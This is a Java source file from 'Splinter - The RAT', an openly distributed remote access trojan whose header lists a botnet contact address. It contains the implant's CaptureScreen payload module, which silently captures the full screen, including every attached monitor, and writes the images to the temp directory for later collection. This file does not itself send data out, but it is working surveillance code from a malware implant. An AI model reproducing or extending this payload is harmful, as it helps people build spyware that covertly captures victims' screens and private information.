/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/




package Implant.Payloads;

import Implant.Driver;
import java.awt.GraphicsConfiguration;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.util.ArrayList;
import javax.imageio.ImageIO;

public class CaptureScreen
{
  static String strMyClassName = "CaptureScreen";

  public static File captureScreen(String screenImgSavePath, String fileNameWithoutExtension)
  {
    try
    {
      if ((screenImgSavePath == null) || (screenImgSavePath.trim().equals("")))
      {
        screenImgSavePath = "." + Driver.fileSeperator;
      }

      File fleCaptureFile = new File(screenImgSavePath, fileNameWithoutExtension + "." + "png");

      Rectangle rectScreen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
      BufferedImage imgCapture = new Robot().createScreenCapture(rectScreen);

      ImageIO.write(imgCapture, "png", fleCaptureFile);

      return fleCaptureFile;
    }
    catch (Exception e)
    {
      Driver.eop("screenImgSavePath", "Drivers - Controller", e, e.getLocalizedMessage(), false);
      try
      {
        screenImgSavePath = "." + Driver.fileSeperator;

        File fleCaptureFile = new File(screenImgSavePath, fileNameWithoutExtension + "." + "png");

        Rectangle rectScreen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage imgCapture = new Robot().createScreenCapture(rectScreen);
        ImageIO.write(imgCapture, "png", new File(screenImgSavePath, fileNameWithoutExtension + "." + "png"));

        return fleCaptureFile;
      }
      catch (Exception ee)
      {
        Driver.sop("Second attempt to save file at current working directory was unsuccessful as well");
      }
    }
    return null;
  }

  public static ArrayList<File> captureScreens(String screenImgSavePath, String fileNameWithoutExtension)
  {
    ArrayList alScreenCaptureHandles = new ArrayList();
    try
    {
      String outFile = "";
      File fleToReturn = null;

      GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
      GraphicsDevice[] arrScreens = ge.getScreenDevices();

      if ((arrScreens != null) && (arrScreens.length > 0))
      {
        for (int i = 0; i < arrScreens.length; i++)
        {
          Robot robot = new Robot(arrScreens[i]);
          Rectangle screenBounds = arrScreens[i].getDefaultConfiguration().getBounds();

          screenBounds.x = 0; screenBounds.y = 0;

          BufferedImage imgScreenCapture = robot.createScreenCapture(screenBounds);

          outFile = i + "_" + fileNameWithoutExtension + "." + "png";
          try
          {
            screenImgSavePath = MapSystemProperties.strTEMP;

            if ((screenImgSavePath.endsWith(Driver.fileSeperator)) || (outFile.startsWith(Driver.fileSeperator)))
            {
              fleToReturn = new File(screenImgSavePath + outFile);
            }
            else
            {
              fleToReturn = new File(screenImgSavePath + Driver.fileSeperator + outFile);
            }

            ImageIO.write(imgScreenCapture, "png", fleToReturn);
          }
          catch (Exception e)
          {
            fleToReturn = new File("." + Driver.fileSeperator, outFile);
            ImageIO.write(imgScreenCapture, "png", fleToReturn);
          }

          alScreenCaptureHandles.add(fleToReturn);
        }

      }

    }
    catch (Exception e)
    {
      Driver.eop("captureScreens", strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return alScreenCaptureHandles;
  }
}